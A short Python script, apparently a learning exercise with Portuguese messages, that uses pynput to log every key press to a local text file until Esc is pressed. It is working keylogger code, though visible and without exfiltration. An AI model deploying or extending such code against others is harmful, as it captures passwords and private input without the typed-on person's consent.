from pynput.keyboard import Listener,Key
import sys, random

def encerrar_programa():
    print('Programa encerrado!')
    sys.exit()

def captureKey(key):
    try:
        with open(log, 'a') as file:
            file.write(f'{str(key)} \n')
    except Exception as e:
        print(f'Erro ao capturar a tecla{e}')
        encerrar_programa()
    if key == Key.esc:
        encerrar_programa()

log = f'yek{random.randint(0,1000)}.txt'
print('Capturando...')

with Listener(on_press=captureKey) as logs:
    try:
        logs.join()
    except Exception as e:
        print('Erro durante a execução do programa')
    finally:
        logs.stop()
        encerrar_programa()